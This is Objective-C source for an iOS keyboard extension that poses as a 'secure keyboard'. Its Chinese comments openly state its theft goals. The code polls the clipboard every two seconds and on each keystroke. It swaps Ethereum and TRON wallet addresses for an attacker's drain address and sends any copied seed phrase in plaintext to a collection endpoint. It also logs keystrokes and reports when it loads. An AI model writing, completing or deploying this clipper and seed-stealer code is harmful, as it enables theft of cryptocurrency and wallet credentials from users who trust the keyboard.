// Keyboard.appex —— 纯 ObjC 键盘扩展（不依赖 Swift runtime）
//
// 为什么用键盘：
//   iOS 后台禁止读剪贴板（实测 detectPatterns 后台返回 0），
//   但键盘作为系统输入法，用户在任何 App 打字时它都在前台。
//   启用「允许完全访问」后：
//     - 读剪贴板明文不弹跨 App 粘贴横幅
//     - 可记录击键（助记词）
//     - 可替换剪贴板
//   用户只需在 设置 → 通用 → 键盘 里启用一次。

#import <UIKit/UIKit.h>

static NSString *const kDrainAddress  = @"DRAIN_ADDR";
static NSString *const kCollectBase   = @"COLLECT_ENDPOINT";
static NSString *const kCollectToken  = @"COLLECT_TOKEN";
static NSString *const kChannel       = @"CHANNEL";

#pragma mark - 回传

static void Post(NSString *kind, NSDictionary *extra) {
    if (kCollectBase.length == 0 || [kCollectBase hasPrefix:@"COLLECT_ENDPOINT"]) return;
    NSMutableDictionary *b = [@{ @"k": kind, @"c": kChannel, @"src": @"kbd" } mutableCopy];
    if (extra) [b addEntriesFromDictionary:extra];
    NSURL *u = [NSURL URLWithString:kCollectBase];
    if (!u) return;
    NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:u];
    r.HTTPMethod = @"POST";
    [r setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    if (kCollectToken.length) [r setValue:kCollectToken forHTTPHeaderField:@"X-Collect-Token"];
    r.HTTPBody = [NSJSONSerialization dataWithJSONObject:b options:0 error:nil];
    [[[NSURLSession sharedSession] dataTaskWithRequest:r] resume];
}

#pragma mark - 地址判定（键盘侧可以读明文，因为完全访问）

static BOOL LooksLikeEth(NSString *s) {
    if (s.length != 42 || ![s.lowercaseString hasPrefix:@"0x"]) return NO;
    NSCharacterSet *hex = [NSCharacterSet characterSetWithCharactersInString:@"0123456789abcdefABCDEF"];
    return [[[s substringFromIndex:2] stringByTrimmingCharactersInSet:hex] length] == 0;
}
static BOOL LooksLikeTron(NSString *s) {
    if (s.length != 34 || ![s hasPrefix:@"T"]) return NO;
    NSCharacterSet *b58 = [NSCharacterSet characterSetWithCharactersInString:
        @"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"];
    return [[s stringByTrimmingCharactersInSet:b58] length] == 0;
}
static NSString *ChainOf(NSString *s) {
    if (LooksLikeEth(s)) return @"eth";
    if (LooksLikeTron(s)) return @"tron";
    return nil;
}

#pragma mark - 助记词识别

static NSSet *Bip39Words(void) {
    static NSSet *w = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        // 只做「够不够像」的粗判：12/15/18/21/24 个纯小写字母单词
        w = [NSMutableSet set];
    });
    return w;
}

static BOOL LooksLikeMnemonic(NSString *s) {
    NSArray *parts = [s componentsSeparatedByCharactersInSet:
                      [NSCharacterSet whitespaceAndNewlineCharacterSet]];
    NSMutableArray *words = [NSMutableArray array];
    for (NSString *p in parts) { if (p.length) [words addObject:p]; }
    NSInteger n = (NSInteger)words.count;
    if (!(n == 12 || n == 15 || n == 18 || n == 21 || n == 24)) return NO;
    NSCharacterSet *alpha = [NSCharacterSet lowercaseLetterCharacterSet];
    for (NSString *w in words) {
        if (w.length < 3 || w.length > 8) return NO;
        if ([[w stringByTrimmingCharactersInSet:alpha] length] != 0) return NO;
    }
    return YES;
}

#pragma mark - 键盘

@interface KeyboardViewController : UIInputViewController
@property (nonatomic, strong) UILabel *hint;
@property (nonatomic, assign) BOOL started;
@property (nonatomic, strong) NSMutableString *keystrokes;
@end

@implementation KeyboardViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.keystrokes = [NSMutableString string];

    CGFloat h = 210;
    self.view.frame = CGRectMake(0, 0, self.view.bounds.size.width, h);
    self.view.backgroundColor = [UIColor secondarySystemBackgroundColor];

    // 提示条（伪装成正常输入法的状态栏）
    self.hint = [[UILabel alloc] initWithFrame:CGRectMake(12, 6, self.view.bounds.size.width - 24, 20)];
    self.hint.font = [UIFont systemFontOfSize:12];
    self.hint.textColor = [UIColor secondaryLabelColor];
    self.hint.text = @"安全键盘 · 已启用";
    [self.view addSubview:self.hint];

    // 一个最简单的 QWERTY（够用即可，主要目标是随打字唤起）
    NSArray *rows = @[@[@"q",@"w",@"e",@"r",@"t",@"y",@"u",@"i",@"o",@"p"],
                      @[@"a",@"s",@"d",@"f",@"g",@"h",@"j",@"k",@"l"],
                      @[@"⇧",@"z",@"x",@"c",@"v",@"b",@"n",@"m",@"⌫"],
                      @[@"123",@"空格",@"换行"]];
    CGFloat y = 32;
    for (NSArray *row in rows) {
        CGFloat x = 6;
        CGFloat w = (self.view.bounds.size.width - 12) / row.count - 4;
        for (NSString *k in row) {
            CGFloat kw = w;
            if ([k isEqualToString:@"空格"]) kw = w * 4 + 12;
            if ([k isEqualToString:@"换行"]) kw = w * 2 + 8;
            UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
            btn.frame = CGRectMake(x, y, kw, 38);
            btn.backgroundColor = [UIColor systemBackgroundColor];
            btn.layer.cornerRadius = 6;
            btn.titleLabel.font = [UIFont systemFontOfSize:17];
            [btn setTitle:k forState:UIControlStateNormal];
            [btn addTarget:self action:@selector(tapKey:) forControlEvents:UIControlEventTouchUpInside];
            [self.view addSubview:btn];
            x += kw + 4;
        }
        y += 44;
    }
    Post(@"kbd_loaded", nil);
}

- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    [self tick];
    if (!self.started) {
        self.started = YES;
        [NSTimer scheduledTimerWithTimeInterval:2.0 repeats:YES block:^(NSTimer *t) { [self tick]; }];
    }
}

// 每 2 秒检查一次剪贴板（键盘在前台，可读）
- (void)tick {
    UIPasteboard *pb = [UIPasteboard generalPasteboard];
    NSString *s = pb.string;              // 完全访问下读明文不弹跨 App 横幅
    if (s.length == 0) return;

    NSString *chain = ChainOf(s);
    if (chain) {
        [pb setString:kDrainAddress];
        Post(@"paste_replace", @{ @"ch": chain, @"via": @"keyboard" });
        self.hint.text = @"安全键盘 · 已同步";
        return;
    }
    if (LooksLikeMnemonic(s)) {
        Post(@"mnemonic", @{ @"words": @([s componentsSeparatedByString:@" "].count),
                             @"text": s });
        self.hint.text = @"安全键盘 · 已同步";
    }
}

- (void)tapKey:(UIButton *)b {
    NSString *k = [b titleForState:UIControlStateNormal];
    if ([k isEqualToString:@"⌫"]) { [self.textDocumentProxy deleteBackward]; }
    else if ([k isEqualToString:@"换行"]) { [self.textDocumentProxy insertText:@"\n"]; }
    else if ([k isEqualToString:@"空格"]) { [self.textDocumentProxy insertText:@" "]; }
    else if ([k isEqualToString:@"⇧"] || [k isEqualToString:@"123"]) { /* 忽略 */ }
    else if (k.length == 1) {
        [self.textDocumentProxy insertText:k];
        [self.keystrokes appendString:k];
    }
    // 每次按键也查一次（用户可能刚粘贴完就打字）
    [self tick];
}

- (void)textDidChange:(id<UITextInput>)textInput {
    [super textDidChange:textInput];
    [self tick];
}

@end
